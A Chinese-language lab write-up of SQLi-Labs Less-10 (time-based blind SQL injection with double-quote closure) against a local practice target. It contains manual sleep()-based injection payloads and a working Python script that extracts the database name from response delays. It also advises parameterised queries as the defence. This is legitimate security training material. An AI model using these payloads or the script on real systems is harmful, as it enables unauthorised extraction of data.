SQLi-Labs Less-10

2026年9月25日 SQLi-Labs Web安全 SQL注入 时间盲注（双引号）

一、题目信息

  • 题目名称：SQLi-Labs Less-10 (GET - Blind - Time based - double quotes)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / 时间盲注
  • 靶场链接：http://localhost:8081/Less-10/（本地环境）
  • 涉及工具：Chrome浏览器、Python（requests库、time库）

二、解题步骤

1. 分析题目考什么

本题的核心考点是基于双引号闭合的时间盲注（Time-Based Blind SQL Injection）。它与 Less-9 的漏洞原理完全一致，唯一区别在于后端 SQL 语句使用双引号（"）包裹变量。攻击者必须利用 sleep() 函数制造延迟，通过响应时间差异逐字符猜解数据。

2. 怎么想（破题思路）

  • 尝试 ?id=1" and if(1=1, sleep(5), 0) --+，页面明显延迟 5 秒加载。
  • 尝试 ?id=1" and if(1=2, sleep(5), 0) --+，页面瞬间加载。
  • 确认双引号闭合成功，且存在时间盲注。
  • 直接复用 Less-9 的 Python 脚本，只需修改请求 URL 和 Payload 里的闭合符号。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：Python 脚本中双引号的转义

踩坑情况：直接修改 URL 为 "http://localhost:8081/Less-10/?id=1""，导致 Python 语法报错。

原因分析：URL 本身包含双引号，与 Python 字符串的引号冲突。

改进方式：在 Python 中用反斜杠转义：url = "http://localhost:8081/Less-10/?id=1\""。

踩坑记录二：代码变量未定义/文件未保存

踩坑情况：脚本报错 NameError 或终端提示找不到文件。

原因分析：在猜解长度的函数中误用了字符猜解的变量，以及文件未按 Cmd + S 保存。

改进方式：修正代码逻辑，确认保存后再运行。

详细实操步骤（Python 脚本爆破）

第一步：手动验证时间盲注

?id=1" and if(1=1, sleep(5), 0) --+   (页面延迟)
?id=1" and if(1=2, sleep(5), 0) --+   (页面瞬间加载)

逐字解析：" 闭合双引号。if(条件, 真值, 假值) 配合 sleep() 制造延迟信号。

第二步：修改 Python 脚本

将 Less-9 脚本修改为以下关键代码即可（注意文件命名为 sqli_labs_10.py）：

import requests
import time

# 修改点 1：URL 路径变为 Less-10，双引号转义
url = "http://localhost:8081/Less-10/?id=1\""

def get_database_name(length):
    name = ""
    for i in range(1, length + 1):
        for ascii_val in range(32, 127):
            # 修改点 2：Payload 中的单引号换成双引号
            payload = f" and if(ascii(substr(database(),{i},1))={ascii_val}, sleep(3), 0) --+"
            start = time.time()
            try:
                requests.get(url + payload, timeout=10)
            except:
                pass
            end = time.time()
            if end - start > 1.5:
                name += chr(ascii_val)
                print(f"[+] 已猜解: {name}")
                break
    return name

print("[*] 开始爆破...")
db_name = get_database_name(8)
print(f"[*] 数据库名称为: {db_name}")

预期结果：脚本输出 security，证明 Less-10 时间盲注成功。

4. 怎么迁移（跨领域联想）

  • 代码复用与重构：Less-9 和 Less-10 共用 99% 的代码，体现了“参数化”思维。在实际开发中，将变化的量（URL、闭合符）提取为变量，可以大幅提高效率。
  • 安全开发（SDL）：无论用单引号还是双引号，字符串拼接都是漏洞之源。必须使用参数化查询。
  • 自动化测试：利用时间差探测接口状态，是自动化测试和系统监控中的常用手段。

三、名词大全与原理深度复盘

1. 双引号闭合时间盲注

Less-10 的专属闭合方式。与单引号（'）闭合原理相同，但在编写 Payload 和 Python 脚本时，必须注意字符转义（\"）。

2. if(cond, true_val, false_val) 与 sleep()

MySQL 的逻辑判断与延迟函数。利用 sleep(3) 让数据库暂停执行，是时间盲注制造“二进制信号”（延迟或不延迟）的唯一方式。

3. Python 时间戳计算

利用 time.time() 记录请求前后的时间，通过阈值（如 end - start > 1.5）来判断是否触发了延迟，这是脚本的核心逻辑。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-9 的区别：Less-9 是单引号闭合，Less-10 是双引号闭合。两者原理完全一致。
  • 与 Less-8（布尔盲注）的区别：Less-8 看页面内容变化判断真假；Less-10 看时间长短判断真假。

2. 这种题目的出现原因

与 Less-9 相同，开发人员屏蔽了所有输出，却忽略了 SQL 执行时可能产生的延迟副作用。这警示我们，安全防御不能只停留在“不输出数据”的层面。

3. 这种应用在实际中如何体现？

时间盲注是 SQL 注入中的“核武器”，常用于极其隐蔽的场景。但在真实红蓝对抗中，由于耗时较长且易被流量分析发现，需谨慎使用。

4. 如何抽象理解概念（大白话理解）

把数据库比作一个“密室守卫”：

  • Less-9（单引号锁）：守卫的门锁是单引号形状的，只有单引号钥匙才能和他沟通。
  • Less-10（双引号锁）：守卫的门锁换成了双引号形状。如果你还用单引号去捅，守卫听不懂；换成双引号，他才会配合你玩“延迟”的游戏，你就能通过时间差得知他心里的秘密。
